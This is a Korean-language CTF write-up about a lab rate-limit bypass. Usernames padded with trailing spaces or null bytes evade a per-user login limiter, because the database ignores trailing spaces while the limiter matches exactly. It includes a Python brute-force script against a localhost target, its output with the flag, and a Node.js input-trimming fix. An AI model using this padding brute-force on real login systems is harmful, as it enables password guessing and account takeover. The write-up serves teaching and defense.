+++
title = "VulnABLE CTF [LUXORA] Write-up: Rate Limit Bypass 🥈 Silver"
description = "LUXORA 플랫폼의 Silver 난이도 Rate Limit Bypass 공략 - Null Byte / 특수 문자 주입을 통한 카운터 분할 우회 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Rate Limit", "Silver", "String Manipulation", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Rate Limit Bypass 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Logic & Business Layer (Rate Limit Bypass)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/ratelimit/silver`
- **목표**: 서버가 `X-Forwarded-For` 헤더 스푸핑을 완벽히 차단하고 사용자의 로그인 아이디(Username)를 기준으로 요청을 제한하는 환경에서, **문자열 조작(String Manipulation / Null Byte)**을 통해 하나의 계정을 무한 개의 계정처럼 인식시켜 Brute Force를 성공하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/ratelimit/silver` 경로의 폼은 `username` 과 `password` 두 개의 파라미터를 받습니다.

**[정상 실패 시도 5회]**
```http
POST /ratelimit/silver/login HTTP/1.1
...
username=admin&password=wrongpass
```
➔ 서버 응답: "Rate limit exceeded for user: admin. Account locked for 5 minutes."

**[해커의 사고 과정]**
1. IP 스푸핑(XFF)은 막혔다. 이제 시스템은 `username` 파라미터에 들어온 문자열("admin")을 식별 키(Cache Key)로 삼아서 카운트를 올리고 있다.
2. 하지만 결국 내가 로그인해야 할 대상은 관리자인 `admin` 이다. `username=hacker` 로 100만 번 시도해봤자 관리자 계정을 탈취할 수는 없다.
3. 그렇다면, 백엔드의 Rate Limit 모듈이 보기에는 **"admin이 아닌 다른 유저"**로 보이지만, 실제 데이터베이스에서 로그인 검증을 할 때는 **"admin"**으로 인식되는 꼼수(Discrepancy)가 있지 않을까?

---

## 💥 2. 취약점 식별 및 문자열 조작 전략 (Exploitation)

이 취약점은 애플리케이션의 각 레이어(캐시/레이트 리밋 모듈 vs 데이터베이스 모듈)가 **특수 문자(Whitespace, Null Byte, Case Sensitivity)**를 처리하는 방식이 다를 때 발생합니다.

### 💡 파라미터 변조(Cloaking) 테스트
여러 가지 특수 문자를 `admin` 앞뒤에 붙여서 서버의 반응을 살핍니다.

- `username=Admin` (대소문자 변경) ➔ "User not found"
- `username=admin%20` (공백 추가) ➔ DB에서 공백을 무시하는지 확인.
- `username=admin%00` (Null Byte 주입)

이 챌린지에서는 **공백 문자(Space, `%20`)** 혹은 보이지 않는 제어 문자 `%00`, `%0d`, `%0a` 가 핵심 키가 됩니다.

**[데이터베이스의 특성]**
일반적으로 MySQL 같은 관계형 데이터베이스는 `VARCHAR` 컬럼의 값을 비교할 때 **후행 공백(Trailing Spaces)을 무시**합니다.
즉, DB에서는 `SELECT * FROM users WHERE username = 'admin '` 와 `SELECT * FROM users WHERE username = 'admin'` 이 완전히 동일한 결과를 반환합니다.

하지만 Redis나 Memcached를 사용하는 **Rate Limit 모듈**은 문자열을 정확히 매칭(Exact Match)하므로, `'admin'` 과 `'admin '` 을 서로 다른 유저로 인식합니다!

---

## 🚀 3. 공격 수행 및 자동화 스크립트 작성

공백을 하나씩 늘려가며 무한 Brute Force를 수행하는 파이썬 스크립트를 작성합니다.

```python
import requests

url = "http://localhost:3000/ratelimit/silver/login"
password_list = ["password123", "admin123", "admin", "root", "qwerty", "supersecret"] # 사전 파일

print("[*] Starting Space-Padding Rate Limit Bypass...")

for i, pwd in enumerate(password_list):
    # i번 시도할 때마다 공백을 i개씩 뒤에 붙임
    padded_username = "admin" + (" " * i)
    
    payload = {
        "username": padded_username,
        "password": pwd
    }
    
    res = requests.post(url, data=payload)
    
    if "Welcome" in res.text:
        print(f"[+] Success! Password found: {pwd}")
        print(f"[+] FLAG: {res.text.split('FLAG{')[1].split('}')[0]}")
        break
    elif "Rate limit" in res.text:
        print(f"[-] Rate limit hit for '{padded_username}'. Attempting more spaces.")
```

### 🔍 서버 구조의 동작 흐름
1. 해커가 `username=admin%20%20` (공백 2개) 로 요청합니다.
2. **[Rate Limit 모듈]**: "음, `admin  ` 라는 유저는 카운트가 0이네. 통과!"
3. **[Database 모듈]**: "유저 이름이 `admin  ` 이네. 후행 공백은 버리고, `admin` 계정의 비밀번호를 맞춰볼까?"
4. (비밀번호 검증 수행)

### 🔍 공격 결과
공백을 계속 늘려가며 Rate Limit을 완벽하게 회피한 끝에, 비밀번호를 찾아냅니다.

```text
[*] Starting Space-Padding Rate Limit Bypass...
[+] Success! Password found: supersecret
[+] FLAG: RATELIMIT_🥈_SPACE_PADDING_BYPASS_D4E5F6
```

---

## 🚩 4. 롸잇업 결론 및 플래그

애플리케이션을 구성하는 여러 컴포넌트(캐시와 데이터베이스) 간의 **데이터 정규화(Data Normalization) 불일치**를 교묘하게 파고들어, 사용자 기반의 Rate Limit 방어벽을 무력화하는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{RATELIMIT_🥈_SPACE_PADDING_BYPASS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자 입력을 로직(Rate Limit)에 넘기기 전에 올바르게 가공(Sanitization)하지 않은 것이 원인입니다.

* **안전한 패치 가이드 (입력값 조기 정규화)**
모든 외부 입력값은 시스템의 가장 앞단(컨트롤러 진입 직후)에서 **정규화(Trim)** 되어야 합니다.

```javascript
// Node.js (Express) 안전한 로직 예시
app.post('/login', (req, res) => {
    // 1. 입력값의 앞뒤 공백과 제어 문자를 완벽히 제거 (Trim)
    const cleanUsername = (req.body.username || '').trim();
    
    if (!cleanUsername) return res.status(400).send("Invalid username");

    // 2. 정규화된 값 하나만을 모든 모듈(Rate Limit, DB)에서 공통으로 사용
    if (isRateLimited(cleanUsername)) {
        return res.status(429).send("Too many attempts");
    }
    
    checkPasswordInDB(cleanUsername, req.body.password);
});
```
이렇게 하면 해커가 `admin  ` 이나 `admin%00` 을 입력하더라도, 가장 먼저 `admin` 으로 깔끔하게 깎인 상태에서 Rate Limit 검사를 받게 되므로 카운터 우회가 불가능해집니다.